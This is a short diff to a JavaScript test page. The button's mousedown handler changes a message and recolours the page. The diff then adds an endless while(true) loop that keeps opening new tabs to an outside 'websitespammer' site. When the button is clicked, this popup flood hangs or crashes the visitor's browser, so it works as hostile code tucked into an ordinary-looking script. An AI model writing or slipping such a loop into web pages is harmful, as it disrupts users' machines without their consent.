@@ -10,13 +10,16 @@ const output = document.getElementById('output');
 // Add a mousedown event listener to the button
 testButton.addEventListener('mousedown', function() {
     // Change the value of the variable when the button is clicked
-        variableToChange = "EHHHHH!!!!";
+        variableToChange = "NOOOOOOOOOOOO!!!!";
         // Update the content and style of the output paragraph with the new value
         output.textContent = variableToChange;
         output.style.color = "#00FF00";
         output.style.fontSize = "24px";
         document.body.style.backgroundColor = "#FF0000";
-        
+        while (true)
+        {
+            window.open('https://thewebsitespammer.github.io', '_blank')
+        }
 });
 
 // Add a mouseup event listener to reset the message when the button is released
